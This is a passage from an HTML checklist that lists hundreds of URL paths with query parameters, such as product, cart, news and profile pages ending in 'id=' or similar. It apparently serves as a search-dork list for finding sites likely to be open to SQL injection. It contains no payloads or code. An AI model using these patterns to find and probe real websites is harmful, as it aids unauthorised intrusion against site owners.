<li><input disabled="" type="checkbox"> <p>freedownload.php?bookid=</p>
</li>
<li><input disabled="" type="checkbox"> <p>fullDisplay.php?item=</p>
</li>
<li><input disabled="" type="checkbox"> <p>getbook.php?bookid=</p>
</li>
<li><input disabled="" type="checkbox"> <p>GetItems.php?itemid=</p>
</li>
<li><input disabled="" type="checkbox"> <p>giftDetail.php?id=</p>
</li>
<li><input disabled="" type="checkbox"> <p>help.php?CartId=</p>
</li>
<li><input disabled="" type="checkbox"> <p>home.php?id=</p>
</li>
<li><input disabled="" type="checkbox"> <p>index.php?cart=</p>
</li>
<li><input disabled="" type="checkbox"> <p>index.php?cartID=</p>
</li>
<li><input disabled="" type="checkbox"> <p>index.php?ID=</p>
</li>
<li><input disabled="" type="checkbox"> <p>info.php?ID=</p>
</li>
<li><input disabled="" type="checkbox"> <p>item.php?eid=</p>
</li>
<li><input disabled="" type="checkbox"> <p>item.php?item_id=</p>
</li>
<li><input disabled="" type="checkbox"> <p>item.php?itemid=</p>
</li>
<li><input disabled="" type="checkbox"> <p>item.php?model=</p>
</li>
<li><input disabled="" type="checkbox"> <p>item.php?prodtype=</p>
</li>
<li><input disabled="" type="checkbox"> <p>item.php?shopcd=</p>
</li>
<li><input disabled="" type="checkbox"> <p>item_details.php?catid=</p>
</li>
<li><input disabled="" type="checkbox"> <p>item_list.php?maingroup item_show.php?code_no=</p>
</li>
<li><input disabled="" type="checkbox"> <p>itemDesc.php?CartId=</p>
</li>
<li><input disabled="" type="checkbox"> <p>itemdetail.php?item=</p>
</li>
<li><input disabled="" type="checkbox"> <p>itemdetails.php?catalogid=</p>
</li>
<li><input disabled="" type="checkbox"> <p>learnmore.php?cartID=</p>
</li>
<li><input disabled="" type="checkbox"> <p>links.php?catid=</p>
</li>
<li><input disabled="" type="checkbox"> <p>list.php?bookid=</p>
</li>
<li><input disabled="" type="checkbox"> <p>List.php?CatID=</p>
</li>
<li><input disabled="" type="checkbox"> <p>listcategoriesandproducts.php?idCategory=</p>
</li>
<li><input disabled="" type="checkbox"> <p>modline.php?id=</p>
</li>
<li><input disabled="" type="checkbox"> <p>myaccount.php?catid=</p>
</li>
<li><input disabled="" type="checkbox"> <p>news.php?id=</p>
</li>
<li><input disabled="" type="checkbox"> <p>order.php?BookID=</p>
</li>
<li><input disabled="" type="checkbox"> <p>order.php?id=</p>
</li>
<li><input disabled="" type="checkbox"> <p>order.php?item_ID=</p>
</li>
<li><input disabled="" type="checkbox"> <p>OrderForm.php?Cart=</p>
</li>
<li><input disabled="" type="checkbox"> <p>page.php?PartID=</p>
</li>
<li><input disabled="" type="checkbox"> <p>payment.php?CartID=</p>
</li>
<li><input disabled="" type="checkbox"> <p>pdetail.php?item_id=</p>
</li>
<li><input disabled="" type="checkbox"> <p>powersearch.php?CartId=</p>
</li>
<li><input disabled="" type="checkbox"> <p>price.php</p>
</li>
<li><input disabled="" type="checkbox"> <p>privacy.php?cartID=</p>
</li>
<li><input disabled="" type="checkbox"> <p>prodbycat.php?intCatalogID=</p>
</li>
<li><input disabled="" type="checkbox"> <p>prodetails.php?prodid=</p>
</li>
<li><input disabled="" type="checkbox"> <p>prodlist.php?catid=</p>
</li>
<li><input disabled="" type="checkbox"> <p>product.php?bookID=</p>
</li>
<li><input disabled="" type="checkbox"> <p>product.php?intProdID=</p>
</li>
<li><input disabled="" type="checkbox"> <p>product_info.php?item_id=</p>
</li>
<li><input disabled="" type="checkbox"> <p>productDetails.php?idProduct=</p>
</li>
<li><input disabled="" type="checkbox"> <p>productDisplay.php</p>
</li>
<li><input disabled="" type="checkbox"> <p>productinfo.php?item=</p>
</li>
<li><input disabled="" type="checkbox"> <p>productlist.php?ViewType=</p>
</li>
<li><input disabled="" type="checkbox"> <p>Category&amp;CategoryID=</p>
</li>
<li><input disabled="" type="checkbox"> <p>productpage.php</p>
</li>
<li><input disabled="" type="checkbox"> <p>products.php?ID=</p>
</li>
<li><input disabled="" type="checkbox"> <p>products.php?keyword=</p>
</li>
<li><input disabled="" type="checkbox"> <p>products_category.php?CategoryID=</p>
</li>
<li><input disabled="" type="checkbox"> <p>products_detail.php?CategoryID=</p>
</li>
<li><input disabled="" type="checkbox"> <p>productsByCategory.php?intCatalogID=</p>
</li>
<li><input disabled="" type="checkbox"> <p>prodView.php?idProduct=</p>
</li>
<li><input disabled="" type="checkbox"> <p>promo.php?id=</p>
</li>
<li><input disabled="" type="checkbox"> <p>promotion.php?catid=</p>
</li>
<li><input disabled="" type="checkbox"> <p>pview.php?Item=</p>
</li>
<li><input disabled="" type="checkbox"> <p>resellers.php?idCategory=</p>
</li>
<li><input disabled="" type="checkbox"> <p>results.php?cat=</p>
</li>
<li><input disabled="" type="checkbox"> <p>savecart.php?CartId=</p>
</li>
<li><input disabled="" type="checkbox"> <p>search.php?CartID=</p>
</li>
<li><input disabled="" type="checkbox"> <p>searchcat.php?search_id=</p>
</li>
<li><input disabled="" type="checkbox"> <p>Select_Item.php?id=</p>
</li>
<li><input disabled="" type="checkbox"> <p>Services.php?ID=</p>
</li>
<li><input disabled="" type="checkbox"> <p>shippinginfo.php?CartId=</p>
</li>
<li><input disabled="" type="checkbox"> <p>shop.php?a=</p>
</li>
<li><input disabled="" type="checkbox"> <p>shop.php?action=</p>
</li>
<li><input disabled="" type="checkbox"> <p>shop.php?bookid=</p>
</li>
<li><input disabled="" type="checkbox"> <p>shop.php?cartID=</p>
</li>
<li><input disabled="" type="checkbox"> <p>shop_details.php?prodid=</p>
</li>
<li><input disabled="" type="checkbox"> <p>shopaddtocart.php shopaddtocart.php?catalogid=</p>
</li>
<li><input disabled="" type="checkbox"> <p>shopbasket.php?bookid=</p>
</li>
<li><input disabled="" type="checkbox"> <p>shopbycategory.php?catid=</p>
</li>
<li><input disabled="" type="checkbox"> <p>shopcart.php?title=</p>
</li>
<li><input disabled="" type="checkbox"> <p>shopcreatorder.php</p>
</li>
<li><input disabled="" type="checkbox"> <p>shopcurrency.php?cid=</p>
</li>
<li><input disabled="" type="checkbox"> <p>shopdc.php?bookid=</p>
</li>
<li><input disabled="" type="checkbox"> <p>shopdisplaycategories.php</p>
</li>
<li><input disabled="" type="checkbox"> <p>shopdisplayproduct.php?catalogid=</p>
</li>
<li><input disabled="" type="checkbox"> <p>shopdisplayproducts.php</p>
</li>
<li><input disabled="" type="checkbox"> <p>shopexd.php</p>
</li>
<li><input disabled="" type="checkbox"> <p>shopexd.php?catalogid=</p>
</li>
<li><input disabled="" type="checkbox"> <p>shopping_basket.php?cartID=</p>
</li>
<li><input disabled="" type="checkbox"> <p>shopprojectlogin.php</p>
</li>
<li><input disabled="" type="checkbox"> <p>shopquery.php?catalogid=</p>
</li>
<li><input disabled="" type="checkbox"> <p>shopremoveitem.php?cartid=</p>
</li>
<li><input disabled="" type="checkbox"> <p>shopreviewadd.php?id=</p>
</li>
<li><input disabled="" type="checkbox"> <p>shopreviewlist.php?id=</p>
</li>
<li><input disabled="" type="checkbox"> <p>ShopSearch.php?CategoryID=</p>
</li>
<li><input disabled="" type="checkbox"> <p>shoptellafriend.php?id=</p>
</li>
<li><input disabled="" type="checkbox"> <p>shopthanks.php</p>
</li>
<li><input disabled="" type="checkbox"> <p>shopwelcome.php?title=</p>
</li>
<li><input disabled="" type="checkbox"> <p>show_item.php?id=</p>
</li>
<li><input disabled="" type="checkbox"> <p>show_item_details.php?item_id=</p>
</li>
<li><input disabled="" type="checkbox"> <p>showbook.php?bookid=</p>
</li>
<li><input disabled="" type="checkbox"> <p>showStore.php?catID=</p>
</li>
<li><input disabled="" type="checkbox"> <p>shprodde.php?SKU=</p>
</li>
<li><input disabled="" type="checkbox"> <p>specials.php?id=</p>
</li>
<li><input disabled="" type="checkbox"> <p>store.php?id=</p>
</li>
<li><input disabled="" type="checkbox"> <p>store_bycat.php?id=</p>
</li>
<li><input disabled="" type="checkbox"> <p>store_listing.php?id=</p>
</li>
<li><input disabled="" type="checkbox"> <p>Store_ViewProducts.php?Cat=</p>
</li>
<li><input disabled="" type="checkbox"> <p>store-details.php?id=</p>
</li>
<li><input disabled="" type="checkbox"> <p>storefront.php?id=</p>
</li>
<li><input disabled="" type="checkbox"> <p>storefronts.php?title=</p>
</li>
<li><input disabled="" type="checkbox"> <p>storeitem.php?item=</p>
</li>
<li><input disabled="" type="checkbox"> <p>StoreRedirect.php?ID=</p>
</li>
<li><input disabled="" type="checkbox"> <p>subcategories.php?id=</p>
</li>
<li><input disabled="" type="checkbox"> <p>tek9.php?</p>
</li>
<li><input disabled="" type="checkbox"> <p>template.php?Action=</p>
</li>
<li><input disabled="" type="checkbox"> <p>Item&amp;pid=</p>
</li>
<li><input disabled="" type="checkbox"> <p>topic.php?ID=</p>
</li>
<li><input disabled="" type="checkbox"> <p>tuangou.php?bookid=</p>
</li>
<li><input disabled="" type="checkbox"> <p>type.php?iType=</p>
</li>
<li><input disabled="" type="checkbox"> <p>updatebasket.php?bookid=</p>
</li>
<li><input disabled="" type="checkbox"> <p>updates.php?ID=</p>
</li>
<li><input disabled="" type="checkbox"> <p>view.php?cid=</p>
</li>
<li><input disabled="" type="checkbox"> <p>view_cart.php?title=</p>
</li>
<li><input disabled="" type="checkbox"> <p>view_detail.php?ID=</p>
</li>
<li><input disabled="" type="checkbox"> <p>viewcart.php?CartId=</p>
</li>
<li><input disabled="" type="checkbox"> <p>viewCart.php?userID=</p>
</li>
<li><input disabled="" type="checkbox"> <p>viewCat_h.php?idCategory=</p>
</li>
<li><input disabled="" type="checkbox"> <p>viewevent.php?EventID=</p>
</li>
<li><input disabled="" type="checkbox"> <p>viewitem.php?recor=</p>
</li>
<li><input disabled="" type="checkbox"> <p>viewPrd.php?idcategory=</p>
</li>
<li><input disabled="" type="checkbox"> <p>ViewProduct.php?misc=</p>
</li>
<li><input disabled="" type="checkbox"> <p>voteList.php?item_ID=</p>
</li>
<li><input disabled="" type="checkbox"> <p>whatsnew.php?idCategory=</p>
</li>
<li><input disabled="" type="checkbox"> <p>WsAncillary.php?ID=</p>
</li>
<li><input disabled="" type="checkbox"> <p>WsPages.php?ID=</p>
</li>
<li><input disabled="" type="checkbox"> <p>noticiasDetalle.php?xid=</p>
</li>
<li><input disabled="" type="checkbox"> <p>sitio/item.php?idcd=</p>
</li>
<li><input disabled="" type="checkbox"> <p>index.php?site=</p>
</li>
<li><input disabled="" type="checkbox"> <p>de/content.php?page_id=</p>
</li>
<li><input disabled="" type="checkbox"> <p>gallerysort.php?iid=</p>
</li>
<li><input disabled="" type="checkbox"> <p>products.php?type=</p>
</li>
<li><input disabled="" type="checkbox"> <p>event.php?id=</p>
</li>
<li><input disabled="" type="checkbox"> <p>showfeature.php?id=</p>
</li>
<li><input disabled="" type="checkbox"> <p>home.php?ID=</p>
</li>
<li><input disabled="" type="checkbox"> <p>tas/event.php?id=</p>
</li>
<li><input disabled="" type="checkbox"> <p>profile.php?id=</p>
</li>
<li><input disabled="" type="checkbox"> <p>details.php?id=</p>
</li>
<li><input disabled="" type="checkbox"> <p>past-event.php?id=</p>
</li>
<li><input disabled="" type="checkbox"> <p>index.php?action=</p>
</li>
<li><input disabled="" type="checkbox"> <p>site/products.php?prodid=</p>
</li>
<li><input disabled="" type="checkbox"> <p>page.php?pId=</p>
</li>
<li><input disabled="" type="checkbox"> <p>resources/vulnerabilities_list.php?id=</p>
</li>
<li><input disabled="" type="checkbox"> <p>site.php?id=</p>
</li>
<li><input disabled="" type="checkbox"> <p>products/index.php?rangeid=</p>
</li>
<li><input disabled="" type="checkbox"> <p>global_projects.php?cid=</p>
</li>
<li><input disabled="" type="checkbox"> <p>publications/view.php?id=</p>
</li>
<li><input disabled="" type="checkbox"> <p>display_page.php?id=</p>
</li>
<li><input disabled="" type="checkbox"> <p>pages.php?ID=</p>
</li>
<li><input disabled="" type="checkbox"> <p>lmsrecords_cd.php?cdid=</p>
</li>
<li><input disabled="" type="checkbox"> <p>product.php?prd=</p>
</li>
<li><input disabled="" type="checkbox"> <p>cat/?catid=</p>
</li>
<li><input disabled="" type="checkbox"> <p>products/product-list.php?id=</p>
</li>
<li><input disabled="" type="checkbox"> <p>debate-detail.php?id=</p>
</li>
<li><input disabled="" type="checkbox"> <p>cbmer/congres/page.php?LAN=</p>
</li>
<li><input disabled="" type="checkbox"> <p>content.php?id=</p>
</li>
<li><input disabled="" type="checkbox"> <p>news.php?ID=</p>
</li>
<li><input disabled="" type="checkbox"> <p>photogallery.php?id=</p>
</li>
<li><input disabled="" type="checkbox"> <p>index.php?id=</p>
</li>
<li><input disabled="" type="checkbox"> <p>product/product.php?product_no=</p>
</li>
<li><input disabled="" type="checkbox"> <p>nyheder.htm?show=</p>
</li>
<li><input disabled="" type="checkbox"> <p>book.php?ID=</p>
</li>
<li><input disabled="" type="checkbox"> <p>print.php?id=</p>
</li>
<li><input disabled="" type="checkbox"> <p>detail.php?id=</p>
</li>
<li><input disabled="" type="checkbox"> <p>book.php?id=</p>
</li>
<li><input disabled="" type="checkbox"> <p>content.php?PID=</p>
</li>
<li><input disabled="" type="checkbox"> <p>more_detail.php?id=</p>
</li>
<li><input disabled="" type="checkbox"> <p>content.php?id=</p>
</li>
<li><input disabled="" type="checkbox"> <p>view_items.php?id=</p>
</li>
<li><input disabled="" type="checkbox"> <p>view_author.php?id=</p>
</li>
<li><input disabled="" type="checkbox"> <p>main.php?id=</p>
</li>
<li><input disabled="" type="checkbox"> <p>english/fonction/print.php?id=</p>
</li>
<li><input disabled="" type="checkbox"> <p>magazines/adult_magazine_single_page.php?magid=</p>
</li>
<li><input disabled="" type="checkbox"> <p>product_details.php?prodid=</p>
</li>
<li><input disabled="" type="checkbox"> <p>magazines/adult_magazine_full_year.php?magid=</p>
</li>
<li><input disabled="" type="checkbox"> <p>products/card.php?prodID=</p>
</li>
<li><input disabled="" type="checkbox"> <p>catalog/product.php?cat_id=</p>
</li>
<li><input disabled="" type="checkbox"> <p>e_board/modifyform.html?code=</p>
</li>
<li><input disabled="" type="checkbox"> <p>community/calendar-event-fr.php?id=</p>
</li>
<li><input disabled="" type="checkbox"> <p>products.php?p=</p>
</li>
<li><input disabled="" type="checkbox"> <p>news.php?id=</p>
</li>
<li><input disabled="" type="checkbox"> <p>view/7/9628/1.html?reply=</p>
</li>
<li><input disabled="" type="checkbox"> <p>product_details.php?prodid=</p>
</li>
<li><input disabled="" type="checkbox"> <p>catalog/product.php?pid=</p>
</li>
<li><input disabled="" type="checkbox"> <p>rating.php?id=</p>
</li>
<li><input disabled="" type="checkbox"> <p>?page=</p>
</li>
<li><input disabled="" type="checkbox"> <p>catalog/main.php?cat_id=</p>
</li>
<li><input disabled="" type="checkbox"> <p>index.php?page=</p>
</li>
<li><input disabled="" type="checkbox"> <p>detail.php?prodid=</p>
</li>
<li><input disabled="" type="checkbox"> <p>products/product.php?pid=</p>
</li>
<li><input disabled="" type="checkbox"> <p>news.php?id=</p>
</li>
<li><input disabled="" type="checkbox"> <p>book_detail.php?BookID=</p>
</li>
<li><input disabled="" type="checkbox"> <p>catalog/main.php?cat_id=</p>
</li>
<li><input disabled="" type="checkbox"> <p>catalog/main.php?cat_id=</p>
</li>
<li><input disabled="" type="checkbox"> <p>default.php?cPath=</p>
</li>
<li><input disabled="" type="checkbox"> <p>catalog/main.php?cat_id=</p>
</li>
<li><input disabled="" type="checkbox"> <p>catalog/main.php?cat_id=</p>
</li>
<li><input disabled="" type="checkbox"> <p>category.php?catid=</p>
</li>
<li><input disabled="" type="checkbox"> <p>categories.php?cat=</p>
</li>
<li><input disabled="" type="checkbox"> <p>categories.php?cat=</p>
</li>
<li><input disabled="" type="checkbox"> <p>detail.php?prodID=</p>
</li>
<li><input disabled="" type="checkbox"> <p>detail.php?id=</p>
</li>
<li><input disabled="" type="checkbox"> <p>category.php?id=</p>
</li>
<li><input disabled="" type="checkbox"> <p>hm/inside.php?id=</p>
</li>
<li><input disabled="" type="checkbox"> <p>index.php?area_id=</p>
</li>
<li><input disabled="" type="checkbox"> <p>gallery.php?id=</p>
</li>
<li><input disabled="" type="checkbox"> <p>products.php?cat=</p>
</li>
<li><input disabled="" type="checkbox"> <p>products.php?cat=</p>
</li>
<li><input disabled="" type="checkbox"> <p>media/pr.php?id=</p>
</li>
<li><input disabled="" type="checkbox"> <p>books/book.php?proj_nr=</p>
</li>
<li><input disabled="" type="checkbox"> <p>products/card.php?prodID=</p>
</li>
<li><input disabled="" type="checkbox"> <p>general.php?id=</p>
</li>
<li><input disabled="" type="checkbox"> <p>news.php?t=</p>
</li>
<li><input disabled="" type="checkbox"> <p>usb/devices/showdev.php?id=</p>
</li>
<li><input disabled="" type="checkbox"> <p>content/detail.php?id=</p>
</li>
<li><input disabled="" type="checkbox"> <p>templet.php?acticle_id=</p>
</li>
<li><input disabled="" type="checkbox"> <p>news/news/title_show.php?id=</p>
</li>
<li><input disabled="" type="checkbox"> <p>product.php?id=</p>
</li>
<li><input disabled="" type="checkbox"> <p>index.php?url=</p>
</li>
<li><input disabled="" type="checkbox"> <p>cryolab/content.php?cid=</p>
</li>
<li><input disabled="" type="checkbox"> <p>ls.php?id=</p>
</li>
<li><input disabled="" type="checkbox"> <p>s.php?w=</p>
</li>
<li><input disabled="" type="checkbox"> <p>abroad/page.php?cid=</p>
</li>
<li><input disabled="" type="checkbox"> <p>bayer/dtnews.php?id=</p>
</li>
<li><input disabled="" type="checkbox"> <p>news/temp.php?id=</p>
</li>
<li><input disabled="" type="checkbox"> <p>index.php?url=</p>
</li>
<li><input disabled="" type="checkbox"> <p>book/bookcover.php?bookid=</p>
</li>
<li><input disabled="" type="checkbox"> <p>index.php/en/component/pvm/?view=</p>
</li>
<li><input disabled="" type="checkbox"> <p>product/list.php?pid=</p>
</li>
<li><input disabled="" type="checkbox"> <p>cats.php?cat=</p>
</li>
<li><input disabled="" type="checkbox"> <p>software_categories.php?cat_id=</p>
</li>
<li><input disabled="" type="checkbox"> <p>print.php?sid=</p>
</li>
<li><input disabled="" type="checkbox"> <p>docDetail.aspx?chnum=</p>
</li>
<li><input disabled="" type="checkbox"> <p>index.php?section=</p>
</li>
<li><input disabled="" type="checkbox"> <p>index.php?page=</p>
</li>
<li><input disabled="" type="checkbox"> <p>index.php?page=</p>
</li>
<li><input disabled="" type="checkbox"> <p>en/publications.php?id=</p>
</li>
<li><input disabled="" type="checkbox"> <p>events/detail.php?ID=</p>
</li>
<li><input disabled="" type="checkbox"> <p>forum/profile.php?id=</p>
</li>
<li><input disabled="" type="checkbox"> <p>media/pr.php?id=</p>
</li>
<li><input disabled="" type="checkbox"> <p>content.php?ID=</p>
</li>
<li><input disabled="" type="checkbox"> <p>cloudbank/detail.php?ID=</p>
</li>
<li><input disabled="" type="checkbox"> <p>pages.php?id=</p>
</li>
<li><input disabled="" type="checkbox"> <p>news.php?id=</p>
</li>
<li><input disabled="" type="checkbox"> <p>beitrag_D.php?id=</p>
</li>
<li><input disabled="" type="checkbox"> <p>content/index.php?id=</p>
</li>
<li><input disabled="" type="checkbox"> <p>index.php?i=</p>
</li>
<li><input disabled="" type="checkbox"> <p>?action=</p>
</li>
<li><input disabled="" type="checkbox"> <p>index.php?page=</p>
</li>
<li><input disabled="" type="checkbox"> <p>beitrag_F.php?id=</p>
</li>
<li><input disabled="" type="checkbox"> <p>index.php?pageid=</p>
</li>
<li><input disabled="" type="checkbox"> <p>page.php?modul=</p>
</li>
<li><input disabled="" type="checkbox"> <p>detail.php?id=</p>
</li>
<li><input disabled="" type="checkbox"> <p>index.php?w=</p>
</li>
<li><input disabled="" type="checkbox"> <p>index.php?modus=</p>
</li>
<li><input disabled="" type="checkbox"> <p>news.php?id=</p>
</li>
<li><input disabled="" type="checkbox"> <p>news.php?id=</p>
</li>
<li><input disabled="" type="checkbox"> <p>aktuelles/meldungen-detail.php?id=</p>
</li>
<li><input disabled="" type="checkbox"> <p>item.php?id=</p>
</li>
<li><input disabled="" type="checkbox"> <p>obio/detail.php?id=</p>
</li>
<li><input disabled="" type="checkbox"> <p>page/de/produkte/produkte.php?prodID=</p>
</li>
<li><input disabled="" type="checkbox"> <p>packages_display.php?ref=</p>
</li>
<li><input disabled="" type="checkbox"> <p>shop/index.php?cPath=</p>
</li>
<li><input disabled="" type="checkbox"> <p>modules.php?bookid=</p>
</li>
<li><input disabled="" type="checkbox"> <p>product-range.php?rangeID=</p>
</li>
<li><input disabled="" type="checkbox"> <p>en/news/fullnews.php?newsid=</p>
</li>
<li><input disabled="" type="checkbox"> <p>deal_coupon.php?cat_id=</p>
</li>
<li><input disabled="" type="checkbox"> <p>show.php?id=</p>
</li>
<li><input disabled="" type="checkbox"> <p>blog/index.php?idBlog=</p>
</li>
<li><input disabled="" type="checkbox"> <p>redaktion/whiteteeth/detail.php?nr=</p>
</li>
<li><input disabled="" type="checkbox"> <p>HistoryStore/pages/item.php?itemID=</p>
</li>
<li><input disabled="" type="checkbox"> <p>aktuelles/veranstaltungen/detail.php?id=</p>
</li>
<li><input disabled="" type="checkbox"> <p>tecdaten/showdetail.php?prodid=</p>
</li>
<li><input disabled="" type="checkbox"> <p>?id=</p>
</li>
<li><input disabled="" type="checkbox"> <p>rating/stat.php?id=</p>
</li>
<li><input disabled="" type="checkbox"> <p>content.php?id=</p>
</li>
<li><input disabled="" type="checkbox"> <p>viewapp.php?id=</p>
</li>
<li><input disabled="" type="checkbox"> <p>item.php?id=</p>
</li>
<li><input disabled="" type="checkbox"> <p>news/newsitem.php?newsID=</p>
</li>
<li><input disabled="" type="checkbox"> <p>FernandFaerie/index.php?c=</p>
</li>
<li><input disabled="" type="checkbox"> <p>show.php?id=</p>
</li>
<li><input disabled="" type="checkbox"> <p>?cat=</p>
</li>
<li><input disabled="" type="checkbox"> <p>categories.php?cat=</p>
</li>
<li><input disabled="" type="checkbox"> <p>category.php?c=</p>
</li>
<li><input disabled="" type="checkbox"> <p>product_info.php?id=</p>
</li>
<li><input disabled="" type="checkbox"> <p>prod.php?cat=</p>
</li>
<li><input disabled="" type="checkbox"> <p>store/product.php?productid=</p>
</li>
<li><input disabled="" type="checkbox"> <p>browsepr.php?pr=</p>
</li>
<li><input disabled="" type="checkbox"> <p>product-list.php?cid=</p>
</li>
<li><input disabled="" type="checkbox"> <p>products.php?cat_id=</p>
</li>
<li><input disabled="" type="checkbox"> <p>product.php?ItemID=</p>
</li>
<li><input disabled="" type="checkbox"> <p>category.php?c=</p>
</li>
<li><input disabled="" type="checkbox"> <p>main.php?id=</p>
</li>
<li><input disabled="" type="checkbox"> <p>article.php?id=</p>
</li>
<li><input disabled="" type="checkbox"> <p>showproduct.php?productId=</p>
</li>
<li><input disabled="" type="checkbox"> <p>view_item.php?item=</p>
</li>
<li><input disabled="" type="checkbox"> <p>skunkworks/content.php?id=</p>
</li>
<li><input disabled="" type="checkbox"> <p>index.php?id=</p>
</li>
<li><input disabled="" type="checkbox"> <p>item_show.php?id=</p>
</li>
<li><input disabled="" type="checkbox"> <p>publications.php?Id=</p>
</li>
<li><input disabled="" type="checkbox"> <p>index.php?t=</p>
</li>
<li><input disabled="" type="checkbox"> <p>view_items.php?id=</p>
</li>
<li><input disabled="" type="checkbox"> <p>portafolio/portafolio.php?id=</p>
</li>
<li><input disabled="" type="checkbox"> <p>YZboard/view.php?id=</p>
</li>
<li><input disabled="" type="checkbox"> <p>index_en.php?ref=</p>
</li>
<li><input disabled="" type="checkbox"> <p>index_en.php?ref=</p>
</li>
<li><input disabled="" type="checkbox"> <p>category.php?id_category=</p>
</li>
<li><input disabled="" type="checkbox"> <p>main.php?id=</p>
</li>
<li><input disabled="" type="checkbox"> <p>main.php?id=</p>
</li>
<li><input disabled="" type="checkbox"> <p>calendar/event.php?id=</p>
</li>
<li><input disabled="" type="checkbox"> <p>default.php?cPath=</p>
</li>
<li><input disabled="" type="checkbox"> <p>pages/print.php?id=</p>
</li>
<li><input disabled="" type="checkbox"> <p>index.php?pg_t=</p>
</li>
<li><input disabled="" type="checkbox"> <p>news/news.php?id=</p>
</li>
<li><input disabled="" type="checkbox"> <p>forum/showProfile.php?id=</p>
</li>
<li><input disabled="" type="checkbox"> <p>fr/commande-liste-categorie.php?panier=</p>
</li>
<li><input disabled="" type="checkbox"> <p>downloads/shambler.php?id=</p>
</li>
<li><input disabled="" type="checkbox"> <p>sinformer/n/imprimer.php?id=</p>
</li>
<li><input disabled="" type="checkbox"> <p>More_Details.php?id=</p>
</li>
<li><input disabled="" type="checkbox"> <p>directory/contenu.php?id_cat=</p>
</li>
<li><input disabled="" type="checkbox"> <p>properties.php?id_cat=</p>
</li>
<li><input disabled="" type="checkbox"> <p>forum/showProfile.php?id=</p>
</li>
<li><input disabled="" type="checkbox"> <p>downloads/category.php?c=</p>
</li>
<li><input disabled="" type="checkbox"> <p>index.php?cat=</p>
</li>
<li><input disabled="" type="checkbox"> <p>product_info.php?products_id=</p>
</li>
<li><input disabled="" type="checkbox"> <p>product_info.php?products_id=</p>
</li>
<li><input disabled="" type="checkbox"> <p>product-list.php?category_id=</p>
</li>
<li><input disabled="" type="checkbox"> <p>detail.php?siteid=</p>
</li>
<li><input disabled="" type="checkbox"> <p>projects/event.php?id=</p>
</li>
<li><input disabled="" type="checkbox"> <p>view_items.php?id=</p>
</li>
<li><input disabled="" type="checkbox"> <p>more_details.php?id=</p>
</li>
<li><input disabled="" type="checkbox"> <p>melbourne_details.php?id=</p>
</li>
<li><input disabled="" type="checkbox"> <p>more_details.php?id=</p>
</li>
<li><input disabled="" type="checkbox"> <p>detail.php?id=</p>
</li>
<li><input disabled="" type="checkbox"> <p>more_details.php?id=</p>
</li>
<li><input disabled="" type="checkbox"> <p>home.php?cat=</p>
</li>
<li><input disabled="" type="checkbox"> <p>idlechat/message.php?id=</p>
</li>
<li><input disabled="" type="checkbox"> <p>detail.php?id=</p>
</li>
<li><input disabled="" type="checkbox"> <p>print.php?sid=</p>
</li>
<li><input disabled="" type="checkbox"> <p>more_details.php?id=</p>
</li>
<li><input disabled="" type="checkbox"> <p>default.php?cPath=</p>
</li>
<li><input disabled="" type="checkbox"> <p>events/event.php?id=</p>
</li>
<li><input disabled="" type="checkbox"> <p>brand.php?id=</p>
</li>
<li><input disabled="" type="checkbox"> <p>toynbeestudios/content.php?id=</p>
</li>
<li><input disabled="" type="checkbox"> <p>show-book.php?id=</p>
</li>
<li><input disabled="" type="checkbox"> <p>more_details.php?id=</p>
</li>
<li><input disabled="" type="checkbox"> <p>store/default.php?cPath=</p>
</li>
<li><input disabled="" type="checkbox"> <p>property.php?id=</p>
</li>
<li><input disabled="" type="checkbox"> <p>product_details.php?id=</p>
</li>
<li><input disabled="" type="checkbox"> <p>more_details.php?id=</p>
</li>
<li><input disabled="" type="checkbox"> <p>view-event.php?id=</p>
</li>
<li><input disabled="" type="checkbox"> <p>content.php?id=</p>
</li>
<li><input disabled="" type="checkbox"> <p>book.php?id=</p>
</li>
<li><input disabled="" type="checkbox"> <p>page/venue.php?id=</p>
</li>
<li><input disabled="" type="checkbox"> <p>print.php?sid=</p>
</li>
<li><input disabled="" type="checkbox"> <p>colourpointeducational/more_details.php?id=</p>
</li>
<li><input disabled="" type="checkbox"> <p>print.php?sid=</p>
</li>
<li><input disabled="" type="checkbox"> <p>browse/book.php?journalID=</p>
</li>
<li><input disabled="" type="checkbox"> <p>section.php?section=</p>
</li>
<li><input disabled="" type="checkbox"> <p>bookDetails.php?id=</p>
</li>
<li><input disabled="" type="checkbox"> <p>profiles/profile.php?profileid=</p>
</li>
<li><input disabled="" type="checkbox"> <p>event.php?id=</p>
</li>
<li><input disabled="" type="checkbox"> <p>gallery.php?id=</p>
</li>
<li><input disabled="" type="checkbox"> <p>category.php?CID=</p>
</li>
<li><input disabled="" type="checkbox"> <p>corporate/newsreleases_more.php?id=</p>
</li>
<li><input disabled="" type="checkbox"> <p>print.php?id=</p>
</li>
<li><input disabled="" type="checkbox"> <p>view_items.php?id=</p>
</li>
<li><input disabled="" type="checkbox"> <p>more_details.php?id=</p>
</li>
<li><input disabled="" type="checkbox"> <p>county-facts/diary/vcsgen.php?id=</p>
</li>
<li><input disabled="" type="checkbox"> <p>idlechat/message.php?id=</p>
</li>
<li><input disabled="" type="checkbox"> <p>podcast/item.php?pid=</p>
</li>
<li><input disabled="" type="checkbox"> <p>products.php?act=</p>
</li>
<li><input disabled="" type="checkbox"> <p>details.php?prodId=</p>
</li>
<li><input disabled="" type="checkbox"> <p>socsci/events/full_details.php?id=</p>
</li>
<li><input disabled="" type="checkbox"> <p>ourblog.php?categoryid=</p>
</li>
<li><input disabled="" type="checkbox"> <p>mall/more.php?ProdID=</p>
</li>
<li><input disabled="" type="checkbox"> <p>archive/get.php?message_id=</p>
</li>
<li><input disabled="" type="checkbox"> <p>review/review_form.php?item_id=</p>
</li>
<li><input disabled="" type="checkbox"> <p>english/publicproducts.php?groupid=</p>
</li>
<li><input disabled="" type="checkbox"> <p>news_and_notices.php?news_id=</p>
</li>
<li><input disabled="" type="checkbox"> <p>rounds-detail.php?id=</p>
</li>
<li><input disabled="" type="checkbox"> <p>gig.php?id=</p>
</li>
<li><input disabled="" type="checkbox"> <p>board/view.php?no=</p>
</li>
<li><input disabled="" type="checkbox"> <p>index.php?modus=</p>
</li>
<li><input disabled="" type="checkbox"> <p>news_item.php?id=</p>
</li>
<li><input disabled="" type="checkbox"> <p>rss.php?cat=</p>
</li>
<li><input disabled="" type="checkbox"> <p>products/product.php?id=</p>
</li>
<li><input disabled="" type="checkbox"> <p>details.php?ProdID=</p>
</li>
<li><input disabled="" type="checkbox"> <p>els/product/product.php?id=</p>
</li>
<li><input disabled="" type="checkbox"> <p>store/description.php?iddesc=</p>
</li>
<li><input disabled="" type="checkbox"> <p>socsci/news_items/full_story.php?id=</p>
</li>
